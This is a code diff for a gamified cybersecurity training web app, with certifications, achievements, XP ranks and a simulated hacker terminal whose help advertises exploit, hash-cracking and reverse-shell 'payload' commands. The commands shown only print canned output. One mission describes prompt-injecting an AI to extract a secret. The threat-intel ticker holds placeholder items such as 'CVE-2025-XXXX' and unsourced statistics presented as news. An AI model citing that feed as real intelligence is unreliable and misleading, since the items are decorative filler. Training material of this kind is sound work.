+   domains:['Incident Response','Logging & Monitoring','Infrastructure Security','Identity & Access Mgmt','Data Protection'],
+   prereqs:'AWS SAA or 2yr AWS exp',
+   desc:"Amazon's premier cloud security certification. High demand and significant salary uplift. Validates advanced AWS security engineering skills."},
+  {name:'AWS Solutions Architect Associate',short:'AWS-SAA',color:'#ff9900',diff:'Intermediate',time:'2–3 months',
+   domains:['Compute & Storage','Networking & CDN','Security & IAM','Database','Cost Optimization'],
+   prereqs:'AWS Cloud Practitioner (optional)',
+   desc:'Foundation cloud architecture cert. Essential stepping stone before AWS Security Specialty. Validates core AWS services knowledge.'},
+  {name:'OSCP',short:'OSCP',color:'#ef4444',diff:'Advanced',time:'6–12 months',
+   domains:['Buffer Overflows','Active Directory Attacks','Web App Exploitation','Pivoting & Tunneling','Report Writing'],
+   prereqs:'PNPT or 1yr hacking exp',
+   desc:'Offensive Security Certified Professional — the gold standard of offensive security. 24-hour hands-on exam. Most respected pentest cert globally.'},
+  {name:'Azure Security Engineer (AZ-500)',short:'AZ-500',color:'#0089d6',diff:'Intermediate',time:'3–5 months',
+   domains:['Identity & Access Mgmt','Platform Protection','Security Operations','Data & App Security'],
+   prereqs:'Azure Fundamentals AZ-900',
+   desc:"Microsoft's cloud security cert for Azure. Validates securing Azure infrastructure, identities, Defender for Cloud, and Sentinel operations."},
+  {name:'GCP Professional Cloud Security Engineer',short:'GCP-SEC',color:'#4285f4',diff:'Intermediate',time:'4–6 months',
+   domains:['Cloud Security Policy','Access Management','Data Protection','Network Security','Compliance & Audit'],
+   prereqs:'GCP Associate Cloud Engineer',
+   desc:'Google Cloud security certification. Validates designing and implementing secure GCP infrastructure across all core services.'},
+  {name:'CKS — Kubernetes Security Specialist',short:'CKS',color:'#326ce5',diff:'Advanced',time:'3–5 months',
+   domains:['Cluster Setup & Hardening','System Hardening','Microservice Vulnerabilities','Supply Chain Security','Monitoring & Runtime Security'],
+   prereqs:'CKA certification required',
+   desc:'The premier Kubernetes security cert. Hands-on exam with live K8s clusters. Essential for cloud-native security engineering roles.'},
+  {name:'HashiCorp Terraform Associate',short:'TF-003',color:'#7b42bc',diff:'Intermediate',time:'1–2 months',
+   domains:['IaC Concepts','Terraform Basics & CLI','State Management','Modules','Workflows & Collaboration'],
+   prereqs:'Basic cloud knowledge',
+   desc:'Foundation DevSecOps certification. Validates Terraform IaC skills essential for cloud security automation and infrastructure-as-code security.'},
+  {name:'CCSK — Certificate of Cloud Security Knowledge',short:'CCSK',color:'#00aaff',diff:'Intermediate',time:'2–3 months',
+   domains:['Cloud Architecture','Governance & Risk','Legal & Compliance','Data Security','Infrastructure Security'],
+   prereqs:'Basic cloud knowledge',
+   desc:"CSA's vendor-neutral cloud security foundation. Excellent theoretical grounding before pursuing vendor-specific cloud security certs."},
+];
+
+const ACHIEVEMENTS=[
+  {id:'first',icon:'👾',name:'First Step',desc:'Complete your first mission',xp:100},
+  {id:'ten',icon:'🔥',name:'On Fire',desc:'Complete 10 missions',xp:200},
+  {id:'fifty',icon:'⚡',name:'Halfway Operator',desc:'Complete 50% of all missions',xp:1000},
+  {id:'full',icon:'🏆',name:'Elite Operator',desc:'Complete 100% of all missions',xp:5000},
+  {id:'ph1c',icon:'🛠️',name:'Foundations Built',desc:'Clear Phase 1: Foundations',xp:500},
+  {id:'ph2c',icon:'🕸️',name:'Web Exploiter',desc:'Clear Phase 2: Web Exploitation',xp:750},
+  {id:'ph3c',icon:'☁️',name:'Cloud Breacher',desc:'Clear Phase 3: Cloud Security',xp:1000},
+  {id:'ph4c',icon:'⚔️',name:'Red Operator',desc:'Clear Phase 4: Offensive Security',xp:1500},
+  {id:'ph5c',icon:'🛡️',name:'Blue Guardian',desc:'Clear Phase 5: Defensive Security',xp:1000},
+  {id:'ph6c',icon:'⚙️',name:'DevSecOps Master',desc:'Clear Phase 6: DevSecOps',xp:1000},
+  {id:'ph7c',icon:'🤖',name:'AI Operative',desc:'Clear Phase 7: AI & Automation',xp:2000},
+  {id:'term5',icon:'💻',name:'Terminal Jockey',desc:'Execute 5 terminal commands',xp:150},
+  {id:'term20',icon:'⌨️',name:'Terminal Master',desc:'Execute 20 terminal commands',xp:300},
+  {id:'acad',icon:'🎓',name:'Academy Scout',desc:'Visit the Cyber Academy section',xp:50},
+  {id:'ronin',icon:'⚡',name:'Cyber Ronin',desc:'Reach Cyber Ronin rank',xp:500},
+  {id:'phantom',icon:'💀',name:'Zero-Day Phantom',desc:'Reach Zero-Day Phantom rank',xp:2000},
+];
+
+// ================================================================
+//  STATE
+// ================================================================
+let S={xp:0,completed:{},termCount:0,achUnlocked:{},lastSeen:null,streak:0,visitedAcad:false};
+
+function loadState(){
+  try{let d=JSON.parse(localStorage.getItem('cnx_v3'));if(d)Object.assign(S,d);}catch(e){}
+  let today=new Date().toDateString();
+  if(S.lastSeen){
+    let yd=new Date();yd.setDate(yd.getDate()-1);
+    if(S.lastSeen===yd.toDateString())S.streak=(S.streak||0)+1;
+    else if(S.lastSeen!==today)S.streak=0;
+  }
+  S.lastSeen=today;
+  saveState();
+}
+function saveState(){localStorage.setItem('cnx_v3',JSON.stringify(S));}
+
+// ================================================================
+//  XP & RANKS
+// ================================================================
+function getRank(xp){
+  let r=RANKS[0];
+  for(let rk of RANKS)if(xp>=rk.min)r=rk;
+  return r;
+}
+function getRankIdx(xp){
+  let i=0;
+  for(let j=0;j<RANKS.length;j++)if(xp>=RANKS[j].min)i=j;
+  return i;
+}
+function addXP(amt){
+  let oldRank=getRankIdx(S.xp);
+  S.xp+=amt;
+  saveState();
+  updateHUD();
+  let newRank=getRankIdx(S.xp);
+  if(newRank>oldRank){
+    let rk=RANKS[newRank];
+    document.getElementById('rutxt').textContent='⚡ RANK UP: '+rk.title.toUpperCase();
+    let f=document.getElementById('ruf');
+    f.classList.remove('act');void f.offsetWidth;f.classList.add('act');
+    showToast('🎖️','RANK UP!','You are now: '+rk.title,rk.color);
+  }
+  checkAchievements();
+}
+
+function updateHUD(){
+  let rk=getRank(S.xp),ri=getRankIdx(S.xp);
+  let nextMin=RANKS[ri+1]?RANKS[ri+1].min:RANKS[ri].min+10000;
+  let pct=Math.min(100,Math.round(((S.xp-rk.min)/(nextMin-rk.min))*100));
+  document.getElementById('xpDsp').textContent=S.xp.toLocaleString();
+  document.getElementById('lvlDsp').textContent=ri+1;
+  document.getElementById('xpFill').style.width=pct+'%';
+  let hrkEl=document.getElementById('hrkEl');
+  hrkEl.textContent='■ '+rk.title.toUpperCase();
+  hrkEl.style.color=rk.color;hrkEl.style.borderColor=rk.color;
+  let cmp=Object.keys(S.completed).length;
+  document.getElementById('stCmp').textContent=cmp;
+  document.getElementById('stStrk').textContent=S.streak||0;
+  let opRk=document.getElementById('opRkBig');
+  if(opRk){opRk.textContent='◈ '+rk.title;opRk.style.color=rk.color;}
+}
+
+// ================================================================
+//  ACHIEVEMENTS
+// ================================================================
+function renderAchievements(){
+  let grid=document.getElementById('achGrid');
+  if(!grid)return;
+  grid.innerHTML=ACHIEVEMENTS.map(a=>{
+    let unlocked=S.achUnlocked[a.id];
+    return `<div class="gl ach${unlocked?'':' lk'}">
+      <span class="achi">${a.icon}</span>
+      <div class="achn">${a.name}</div>
+      <div class="achd">${a.desc}</div>
+      <div class="achx">+${a.xp} XP</div>
+    </div>`;
+  }).join('');
+}
+
+function checkAchievements(){
+  let cmp=Object.keys(S.completed).length;
+  let totMods=ROADMAP.reduce((a,p)=>a+p.weeks.reduce((b,w)=>b+w.modules.length,0),0);
+  let pct=totMods?Math.round((cmp/totMods)*100):0;
+  let phMap={};
+  ROADMAP.forEach(ph=>{
+    let mids=ph.weeks.flatMap(w=>w.modules.map(m=>m.id));
+    phMap[ph.id]=mids.every(id=>S.completed[id]);
+  });
+  let rules={
+    first:cmp>=1, ten:cmp>=10,
+    fifty:pct>=50, full:pct>=100,
+    ph1c:phMap['ph1'],ph2c:phMap['ph2'],ph3c:phMap['ph3'],
+    ph4c:phMap['ph4'],ph5c:phMap['ph5'],ph6c:phMap['ph6'],ph7c:phMap['ph7'],
+    term5:S.termCount>=5, term20:S.termCount>=20,
+    acad:S.visitedAcad,
+    ronin:getRankIdx(S.xp)>=9, phantom:getRankIdx(S.xp)>=11
+  };
+  ACHIEVEMENTS.forEach(a=>{
+    if(rules[a.id]&&!S.achUnlocked[a.id]){
+      S.achUnlocked[a.id]=true;saveState();
+      showToast(a.icon,'BADGE UNLOCKED',a.name+' +'+a.xp+' XP','var(--yellow)');
+    }
+  });
+  renderAchievements();
+}
+
+// ================================================================
+//  TOAST
+// ================================================================
+function showToast(icon,title,body,color){
+  let d=document.createElement('div');d.className='toast';
+  if(color)d.style.borderColor=color;
+  d.innerHTML=`<div class="ti2">${icon}</div><div><div class="tttl"${color?` style="color:${color}"`:''}>${title}</div><div class="tbd">${body}</div></div>`;
+  document.getElementById('tc').appendChild(d);
+  setTimeout(()=>d.remove(),3600);
+}
+
+// ================================================================
+//  SECTIONS
+// ================================================================
+function showSec(id,btn){
+  document.querySelectorAll('.sec').forEach(s=>s.classList.remove('act'));
+  document.querySelectorAll('.nb').forEach(b=>b.classList.remove('act'));
+  document.getElementById('sec-'+id).classList.add('act');
+  btn.classList.add('act');
+  if(id==='academy'&&!S.visitedAcad){S.visitedAcad=true;saveState();checkAchievements();}
+  if(id==='roadmap')renderRoadmap();
+  if(id==='achievements')renderAchievements();
+}
+
+// ================================================================
+//  HOME
+// ================================================================
+function renderHome(){
+  // Ticker
+  const ticks=[
+    '⚠ CRITICAL VULN: CVE-2025-XXXX — Kubernetes API Server RCE • PATCH IMMEDIATELY',
+    '🔴 ACTIVE CAMPAIGN: APT-42 targeting cloud IAM roles via phishing',
+    '🟡 NEW TECHNIQUE: JWT algorithm confusion attack gaining traction',
+    '🟢 RELEASED: Nuclei v3.3 with 9,800+ templates for vulnerability scanning',
+    '⚠ AWS S3 misconfiguration affects 47,000 buckets — enable block public access',
+    '🔴 ZERO-DAY: GitHub Actions workflow injection via pull_request_target',
+    '🟡 MITRE ATT&CK v16 released — 14 new techniques in cloud and container matrix',
+    '🟢 CERTIFICATION: OSCP+ adds Active Directory focus — prep roadmap updated',
+  ];
+  const ti=document.getElementById('tkInner');
+  if(ti){ti.innerHTML='';[...ticks,...ticks].forEach(t=>{
+    let s=document.createElement('span');s.className='tkit';
+    s.innerHTML=`<span class="tg">[INTEL]</span>${t}`;ti.appendChild(s);
+  });}
+
+  // Stats row
+  let cmp=Object.keys(S.completed).length;
+  let tot=ROADMAP.reduce((a,p)=>a+p.weeks.reduce((b,w)=>b+w.modules.length,0),0);
+  let pct=tot?Math.round((cmp/tot)*100):0;
+  let ri=getRankIdx(S.xp);
+  const stats=[
+    {v:S.xp.toLocaleString(),l:'Total XP',c:'var(--cyan)'},
+    {v:cmp+'/'+tot,l:'Missions Done',c:'var(--green)'},
+    {v:pct+'%',l:'Campaign Progress',c:'var(--purple)'},
+    {v:(S.streak||0)+'d',l:'Day Streak',c:'var(--yellow)'},
+    {v:(ri+1)+'/13',l:'Rank Level',c:'var(--red)'},
+    {v:Object.keys(S.achUnlocked).length,l:'Badges Earned',c:'var(--pink)'},
+  ];
+  document.getElementById('statsRow').innerHTML=stats.map(s=>
+    `<div class="gl sc"><span class="scv" style="color:${s.c};text-shadow:0 0 14px ${s.c};">${s.v}</span><span class="scl">${s.l}</span></div>`
+  ).join('');
+
+  // Operator card skill bars
+  let phDone=ROADMAP.map(ph=>{
+    let mids=ph.weeks.flatMap(w=>w.modules.map(m=>m.id));
+    let done=mids.filter(id=>S.completed[id]).length;
+    return Math.round((done/mids.length)*100);
+  });
+  const skills=[
+    {n:'Linux & Networking',pct:phDone[0]||0,c:'var(--cyan)'},
+    {n:'Web Exploitation',pct:phDone[1]||0,c:'var(--yellow)'},
+    {n:'Cloud Security',pct:phDone[2]||0,c:'#4488ff'},
+    {n:'Offensive Ops',pct:phDone[3]||0,c:'var(--red)'},
+    {n:'Defensive Ops',pct:phDone[4]||0,c:'var(--green)'},
+    {n:'DevSecOps',pct:phDone[5]||0,c:'var(--purple)'},
+    {n:'AI & Automation',pct:phDone[6]||0,c:'var(--pink)'},
+  ];
+  document.getElementById('skillBars').innerHTML=skills.map(s=>
+    `<div class="skr"><span class="skn">${s.n}</span><div class="skt"><div class="skbar" style="width:${s.pct}%;background:${s.c};box-shadow:0 0 6px ${s.c};"></div></div><span class="skpc">${s.pct}%</span></div>`
+  ).join('');
+
+  let rk=getRank(S.xp);
+  let opidNum=document.getElementById('opid').textContent.replace('CN#','');
+  document.getElementById('opName').textContent='SHADOW_'+opidNum;
+  let opRk=document.getElementById('opRkBig');
+  if(opRk){opRk.textContent='◈ '+rk.title;opRk.style.color=rk.color;}
+
+  // Daily missions
+  const missions=[
+    {t:'OPERATION: BANDIT',d:'Complete OverTheWire Bandit levels 1-5. Master Linux terminal navigation and basic file operations.',xp:150,phase:'Foundations'},
+    {t:'OPERATION: INJECTION',d:'Exploit a SQL Injection vulnerability on PortSwigger Academy. Extract database contents using UNION-based technique.',xp:200,phase:'Web Exploitation'},
+    {t:'OPERATION: CLOUD RECON',d:'Enumerate a vulnerable AWS S3 bucket and identify publicly exposed sensitive data using Flaws.cloud challenge.',xp:250,phase:'Cloud Security'},
+    {t:'OPERATION: RED BLADE',d:'Perform privilege escalation on a TryHackMe Linux machine. Find the SUID binary and exploit it to root.',xp:300,phase:'Offensive Ops'},
+    {t:'OPERATION: SENTINEL',d:"Analyze a DFIR challenge on CyberDefenders. Reconstruct the attacker's timeline from 3 different log sources.",xp:275,phase:'Defensive Ops'},
+    {t:'OPERATION: GHOST PIPE',d:'Set up GitHub Actions SAST scanning with Semgrep on a vulnerable NodeGoat repository and fix 3 critical findings.',xp:250,phase:'DevSecOps'},
+    {t:'OPERATION: NEURAL BREACH',d:'Complete the Gandalf AI prompt injection challenge. Break through all 7 levels to extract the secret password.',xp:350,phase:'AI & Automation'},
+  ];
+  let dm=missions[new Date().getDay()%missions.length];
+  document.getElementById('dailyMission').innerHTML=
+    `<div class="mttl">${dm.t}</div><div class="mdsc">${dm.d}</div>
+     <div class="mrw"><span class="xbg">+${dm.xp} XP</span><span style="color:var(--txd);font-family:var(--fm);font-size:10px;">PHASE: ${dm.phase}</span></div>`;
+
+  // Phase progress overview
+  document.getElementById('phProgOv').innerHTML=ROADMAP.map(ph=>{
+    let mids=ph.weeks.flatMap(w=>w.modules.map(m=>m.id));
+    let done=mids.filter(id=>S.completed[id]).length;
+    let p=Math.round((done/mids.length)*100);
+    return `<div class="pprow"><span class="ppname" style="color:${ph.color};">${ph.phase}</span>
+      <div class="ppt"><div class="ppb" style="width:${p}%;background:${ph.color};box-shadow:0 0 5px ${ph.color};"></div></div>
+      <span class="pppc">${p}%</span></div>`;
+  }).join('');
+
+  // Intel feed
+  const intel=[
+    {tag:'[RED]',txt:'New SSRF → IMDS exploit chain discovered in AWS environments using HTTP/1.1 header confusion. CVSSv3: 9.8',c:'var(--red)'},
+    {tag:'[BLUE]',txt:'CISA released 12 new KEV entries this week. Patch KB5040442 addresses critical Windows kernel elevation of privilege.',c:'var(--cyan)'},
+    {tag:'[CLOUD]',txt:'Research: 34% of GKE clusters have overprivileged service accounts. KubeHound recommended for internal assessments.',c:'var(--purple)'},
+    {tag:'[AI]',txt:'New paper: Indirect prompt injection via RAG document poisoning allows attacker persistence in LLM agent workflows.',c:'var(--pink)'},
+    {tag:'[DEVSEC]',txt:'GitHub Actions workflow injection via pull_request_target being actively exploited. Audit all public CI/CD pipelines.',c:'var(--yellow)'},
+    {tag:'[CTI]',txt:'APT-42 campaign: Spear-phishing targeting AWS IAM admin users with fake MFA reset portals. Enable phishing-resistant MFA.',c:'var(--orange)'},
+  ];
+  document.getElementById('intelItems').innerHTML=intel.map(i=>
+    `<div class="iitem"><span class="itag" style="color:${i.c};">${i.tag}</span>${i.txt}</div>`
+  ).join('');
+}
+
+// ================================================================
+//  ROADMAP
+// ================================================================
+function renderRoadmap(){
+  let srch=(document.getElementById('srch')||{}).value?.toLowerCase()||'';
+  let dif=(document.getElementById('dfil')||{}).value||'all';
+  let cont=document.getElementById('rmCont');
+  if(!cont)return;
+  cont.innerHTML='';
+  let totalMods=0,doneMods=0;
+  ROADMAP.forEach((ph)=>{
+    if(dif!=='all'&&ph.difficulty!==dif)return;
+    let phMods=ph.weeks.flatMap(w=>w.modules);
+    let phDone=phMods.filter(m=>S.completed[m.id]).length;
+    let phPct=Math.round((phDone/phMods.length)*100);
+    let pc=document.createElement('div');
+    pc.className='pc';pc.style.borderColor=ph.color+'44';
+    pc.innerHTML=`<div class="ph" onclick="togglePhase(this)">
+      <div class="pnum" style="color:${ph.color};">${ph.phase.split(' ')[1]}</div>
+      <div class="pinfo">
+        <div class="pname" style="color:${ph.color};">${ph.icon} ${ph.name}</div>
+        <div class="pmeta">
+          <span>${ph.difficulty}</span>
+          <span>${phDone}/${phMods.length} complete</span>
+          <span>${phPct}%</span>
+          <span style="color:${ph.color};font-family:var(--fm);font-size:10px;">${ph.desc.substring(0,60)}…</span>
+        </div>
+      </div>
+      <div class="pbadge" style="color:${ph.color};border-color:${ph.color}44;">${ph.difficulty}</div>
+      <div class="parr">▶</div>
+    </div>`;
+    let body=document.createElement('div');body.className='pbody';
+    ph.weeks.forEach(w=>{
+      let wDiv=document.createElement('div');wDiv.className='wk';
+      wDiv.innerHTML=`<div class="wkt">${w.title}</div>`;
+      w.modules.forEach(m=>{
+        let txt=[...m.topics,...m.tasks,...m.labs].join(' ').toLowerCase();
+        if(srch&&!txt.includes(srch)&&!m.title.toLowerCase().includes(srch))return;
+        totalMods++;if(S.completed[m.id])doneMods++;
+        let done=S.completed[m.id];
+        let mc=document.createElement('div');mc.className='mc'+(done?' done':'');mc.id='mc-'+m.id;
+        mc.innerHTML=`<div class="mtop">
+          <input class="mchk" type="checkbox" ${done?'checked':''} onchange="toggleMod('${m.id}',${m.xp},this)"/>
+          <span class="mt">${m.title}</span>
+          <span class="xchip">+${m.xp} XP</span>
+        </div>
+        <div class="mcols">
+          <div class="col" style="border-color:${ph.color}55;">
+            <div class="colt" style="color:var(--yellow);">📚 Topics</div>
+            <ul class="coll">${m.topics.map(t=>`<li>${t}</li>`).join('')}</ul>
+          </div>
+          <div class="col" style="border-color:${ph.color}55;">
+            <div class="colt" style="color:var(--green);">⚡ Tasks</div>
+            <ul class="coll">${m.tasks.map(t=>`<li>${t}</li>`).join('')}</ul>
+          </div>
+          <div class="col" style="border-color:${ph.color}55;">
+            <div class="colt" style="color:var(--pink);">🧪 Labs</div>
+            <ul class="coll">${m.labs.map(t=>`<li>${t}</li>`).join('')}</ul>
+          </div>
+        </div>`;
+        wDiv.appendChild(mc);
+      });
+      body.appendChild(wDiv);
+    });
+    pc.appendChild(body);
+    cont.appendChild(pc);
+  });
+  let pct=totalMods?Math.round((doneMods/totalMods)*100):0;
+  let pf=document.getElementById('pgFill');
+  if(pf)pf.style.width=pct+'%';
+  let pt=document.getElementById('pgTxt');
+  if(pt)pt.textContent=doneMods+' / '+totalMods+' missions completed';
+  let pp=document.getElementById('pgPct');
+  if(pp)pp.textContent=pct+'%';
+}
+
+function togglePhase(el){
+  el.closest('.pc').classList.toggle('open');
+}
+
+function toggleMod(id,xp,cb){
+  if(cb.checked){
+    if(!S.completed[id]){S.completed[id]=true;addXP(xp);saveState();
+      showToast('✅','MISSION COMPLETE','+'+xp+' XP earned','var(--green)');
+    }
+  } else {
+    delete S.completed[id];saveState();updateHUD();
+  }
+  let mc=document.getElementById('mc-'+id);
+  if(mc)mc.className='mc'+(cb.checked?' done':'');
+  renderHome();checkAchievements();
+  let tot=ROADMAP.reduce((a,p)=>a+p.weeks.reduce((b,w)=>b+w.modules.length,0),0);
+  let done=Object.keys(S.completed).length;
+  let pf=document.getElementById('pgFill');
+  if(pf)pf.style.width=Math.round((done/tot)*100)+'%';
+  let pt=document.getElementById('pgTxt'),pp=document.getElementById('pgPct');
+  if(pt)pt.textContent=done+' / '+tot+' missions completed';
+  if(pp)pp.textContent=Math.round((done/tot)*100)+'%';
+}
+
+// ================================================================
+//  ACADEMY
+// ================================================================
+function renderAcademy(){
+  const tagMap={off:'toff',def:'tdef',cld:'tcld',web:'tweb',ctf:'tctf',lin:'tlin'};
+  const tagLabel={off:'OFFENSE',def:'DEFENSE',cld:'CLOUD',web:'WEB',ctf:'CTF',lin:'LINUX'};
+  document.getElementById('acadGrid').innerHTML=ACADEMY.sort((a,b)=>a.order-b.order).map(p=>
+    `<div class="gl plc">
+      <span class="plico">${p.icon}</span>
+      <div class="plnm">${p.name}</div>
+      <div class="plds">${p.desc}</div>
+      <div class="ptags">${p.tags.map(t=>`<span class="tag ${tagMap[t]}">${tagLabel[t]}</span>`).join('')}</div>
+      <div class="plft">
+        <span class="pllv" style="color:var(--txd);">⊙ ${p.level}</span>
+        <a class="pla" href="${p.url}" target="_blank" rel="noopener">ENTER →</a>
+      </div>
+    </div>`
+  ).join('');
+}
+
+// ================================================================
+//  CERTIFICATIONS
+// ================================================================
+function renderCerts(){
+  const diffColor={Beginner:'var(--green)','Beginner–Intermediate':'#4caf50',Intermediate:'var(--yellow)','Intermediate–Advanced':'var(--orange)',Advanced:'var(--red)',Expert:'var(--pink)'};
+  document.getElementById('certGrid').innerHTML=CERTS.map(c=>{
+    let dc=diffColor[c.diff]||'var(--cyan)';
+    return `<div class="gl cc" style="border-color:${c.color}33;">
+      <div class="cchd">
+        <div class="ccnm" style="color:${c.color};text-shadow:0 0 14px ${c.color}55;">${c.short}</div>
+        <div class="ccbg" style="color:${dc};border-color:${dc}44;">${c.diff}</div>
+      </div>
+      <div class="ccnm" style="font-size:.7rem;color:var(--txb);margin-bottom:8px;font-weight:400;">${c.name}</div>
+      <div class="ccbd">${c.desc}</div>
+      <div class="ccir">
+        <span class="ccii">⏱ ${c.time}</span>
+        <span class="ccii">🔑 ${c.prereqs}</span>
+      </div>
+      <div class="ccdoms">
+        <div class="ccdt">EXAM DOMAINS</div>
+        <ul class="ccdl">${c.domains.map(d=>`<li>${d}</li>`).join('')}</ul>
+      </div>
+    </div>`;
+  }).join('');
+}
+
+// ================================================================
+//  TERMINAL — unified, single implementation
+// ================================================================
+function termPrint(text, cls='out'){
+  const line=document.createElement('div');
+  line.className='tl '+cls;
+  line.textContent=text;
+  tScr.appendChild(line);
+  tScr.scrollTop=tScr.scrollHeight;
+}
+
+function termPrintDelayed(lines, baseDelay=0, step=80){
+  lines.forEach((l,i)=>{
+    setTimeout(()=>{
+      termPrint(l.v||l, l.t||'out');
+    }, baseDelay + i*step);
+  });
+}
+
+function termCmd(raw){
+  const cmd=raw.trim();
+  if(!cmd)return;
+
+  // Track history
+  commandHistory.push(cmd);
+  historyIndex=commandHistory.length;
+
+  // Echo prompt
+  termPrint(`operator@nexus:~$ ${cmd}`, 'cmd');
+
+  // Track terminal usage for achievements
+  S.termCount=(S.termCount||0)+1;
+  saveState();
+  checkAchievements();
+
+  const c=cmd.toLowerCase();
+  const parts=cmd.trim().split(/\s+/);
+  const base=parts[0].toLowerCase();
+  const arg=parts.slice(1).join(' ');
+
+  // ── HELP ──────────────────────────────────────────────────────
+  if(c==='help'){
+    termPrint('╔══════════════════════════════════════════════════╗','inf');
+    termPrint('║  CYBER NEXUS // SECURE SHELL v3.7.1              ║','inf');
+    termPrint('║  Authorized Personnel Only — Type carefully.     ║','inf');
+    termPrint('╚══════════════════════════════════════════════════╝','inf');
+    termPrint('');
+    [
+      '  help              — This help screen',
+      '  whoami            — Display operator identity',
+      '  status            — System & operator status',
+      '  rank              — Show current rank',
+      '  skills            — Show skill progression',
+      '  missions          — List completed missions',
+      '  nmap [target]     — Network reconnaissance scan',
+      '  scan [--vuln]     — Vulnerability assessment',
+      '  recon [target]    — Passive OSINT reconnaissance',
+      '  ls [-la]          — List directory contents',
+      '  cat [file]        — Display file contents',
+      '  ps -aux           — List running processes',
+      '  ifconfig          — Network interface details',
+      '  exploit [options] — Simulate exploit execution',
+      '  crack [hash]      — Hash cracking simulation',
+      '  decrypt [str]     — Decode Base64 payload',
+      '  payload [type]    — Generate reverse shell payload',
+      '  mitre [technique] — MITRE ATT&CK lookup',
+      '  breach            — Multi-stage attack chain demo',
+      '  matrix            — Activate matrix mode',
+      '  neofetch          — System information',
+      '  clear             — Clear terminal',
+    ].forEach(x=>termPrint(x,'out'));
+    termPrint('');
+    termPrint('[!] Some commands are classified. Find them yourself, operator.','war');
+    return;
+  }
+
+  // ── WHOAMI ────────────────────────────────────────────────────
+  if(c==='whoami'){
+    let rk=getRank(S.xp);
+    termPrint('operator','out');
+    termPrint('uid=1337(operator) gid=1337(operators) groups=1337(operators),4(adm),27(sudo)','out');
+    termPrint('Clearance Level: TOP SECRET // CYBER NEXUS PROGRAM','out');
+    termPrint('Role: Elite Security Operative','out');
+    termPrint('Specialization: Cloud Security + Offensive Operations','out');
+    termPrint(`Current Rank: ${rk.icon} ${rk.title}`,'inf');
+    termPrint(`Total XP: ${S.xp.toLocaleString()} | Missions: ${Object.keys(S.completed).length}`,'inf');
+    return;
+  }
+
+  // ── STATUS ────────────────────────────────────────────────────
+  if(c==='status'){
+    let rk=getRank(S.xp);
+    let cmp=Object.keys(S.completed).length;
+    let tot=ROADMAP.reduce((a,p)=>a+p.weeks.reduce((b,w)=>b+w.modules.length,0),0);
+    termPrint('[SYSTEM STATUS] — '+new Date().toUTCString(),'inf');
+    termPrint('','out');
+    termPrint('  ██ THREAT LEVEL: CRITICAL (APT Activity Detected)','war');
+    termPrint('  ✓  Firewall: ONLINE — 847 packets blocked/min','out');
+    termPrint('  ✓  IDS/IPS: ACTIVE — 3 alerts in last hour','out');
+    termPrint('  ⚠  GuardDuty: 2 high-severity findings open','war');
+    termPrint('  ✓  CloudTrail: LOGGING — All API calls captured','out');
+    termPrint('  ⚠  Unpatched CVEs: 7 critical, 23 high','war');
+    termPrint('  ✓  WAF: ACTIVE — 1,337 attacks blocked today','out');
+    termPrint('  ✗  SOC Coverage: GAP DETECTED — Off-hours monitoring weak','err');
+    termPrint('','out');
+    termPrint(`  OPERATOR XP: ${S.xp.toLocaleString()} | RANK: ${rk.title}`,'inf');
+    termPrint(`  MISSIONS: ${cmp} / ${tot} (${tot?Math.round((cmp/tot)*100):0}%) complete`,'inf');
+    termPrint(`  DAY STREAK: ${S.streak||0} days`,'inf');
+    termPrint('','out');
+    termPrint('Recommendation: Escalate to incident response team.','inf');
+    return;
+  }
+
+  // ── RANK ──────────────────────────────────────────────────────
+  if(c==='rank'){
+    let rk=getRank(S.xp);
+    let ri=getRankIdx(S.xp);
+    let nextMin=RANKS[ri+1]?RANKS[ri+1].min:null;
+    termPrint(`Current Rank → ${rk.icon} ${rk.title}`,'inf');
+    termPrint(`XP: ${S.xp.toLocaleString()} / ${nextMin?nextMin.toLocaleString():'MAX'}`,'out');
+    if(nextMin){
+      let next=RANKS[ri+1];
+      termPrint(`Next Rank: ${next.icon} ${next.title} (need ${(nextMin-S.xp).toLocaleString()} more XP)`,'war');
+    } else {
+      termPrint('You have reached the pinnacle. Elite Security Architect. 🏆','out');
+    }
+    return;
+  }
+
+  // ── SKILLS ────────────────────────────────────────────────────
+  if(c==='skills'){
+    let phDone=ROADMAP.map(ph=>{
+      let mids=ph.weeks.flatMap(w=>w.modules.map(m=>m.id));
+      let done=mids.filter(id=>S.completed[id]).length;
+      return {name:ph.name,pct:Math.round((done/mids.length)*100)};
+    });
+    termPrint('SKILL MATRIX:','inf');
+    phDone.forEach(s=>{
+      let bar='█'.repeat(Math.floor(s.pct/5))+'░'.repeat(20-Math.floor(s.pct/5));
+      termPrint(`  ${s.name.padEnd(22)} [${bar}] ${s.pct}%`,'out');
+    });
+    return;
+  }
+
+  // ── MISSIONS ──────────────────────────────────────────────────
+  if(c==='missions'){
+    let keys=Object.keys(S.completed);
+    termPrint(`Completed missions: ${keys.length}`,'inf');
+    if(keys.length===0){termPrint('No missions complete yet. Start the roadmap!','war');return;}
+    keys.slice(0,20).forEach(id=>{
+      let mod=ROADMAP.flatMap(p=>p.weeks.flatMap(w=>w.modules)).find(m=>m.id===id);
+      termPrint(`  ✔ ${mod?mod.title:id}`,'out');
+    });
+    if(keys.length>20)termPrint(`  ... and ${keys.length-20} more.`,'war');
+    return;
+  }
+
+  // ── LS ────────────────────────────────────────────────────────
+  if(base==='ls'){
+    [
+      'total 48',
+      'drwxr-xr-x 2 operator operator 4096 May 12 03:37 .',
+      'drwxr-xr-x 8 root     root     4096 May 12 00:00 ..',
+      '-rw-r--r-- 1 operator operator  220 May 12 00:00 .bash_logout',
+      '-rw-r--r-- 1 operator operator 3526 May 12 00:00 .bashrc',
+      'drwxr-xr-x 3 operator operator 4096 May 12 01:15 exploits/',
+      'drwxr-xr-x 5 operator operator 4096 May 12 02:22 recon/',
+      '-rwxr-xr-x 1 operator operator 8192 May 12 03:30 scanner.py',
+      '-rw------- 1 operator operator 1024 May 12 03:37 secrets.enc',
+      '-rw-r--r-- 1 operator operator 2048 May 12 02:00 targets.txt',
+    ].forEach(x=>termPrint(x,'out'));
+    return;
+  }
+
+  // ── PS ────────────────────────────────────────────────────────
+  if(base==='ps'){
+    [
+      'USER       PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND',
+      'root         1  0.0  0.0  17936  1128 ?        Ss   00:00   0:02 /sbin/init',
+      'operator  1337  2.3  1.2  98432 24576 pts/0    Sl   03:30   0:14 python3 scanner.py',
+      'operator  1338  0.5  0.3  55296 12288 pts/1    S    03:31   0:04 ./recon/amass',
+      'operator  1341 18.7  3.8 524288 77824 pts/2    R+   03:35   2:37 nmap -sV -sC 10.0.0.0/24',
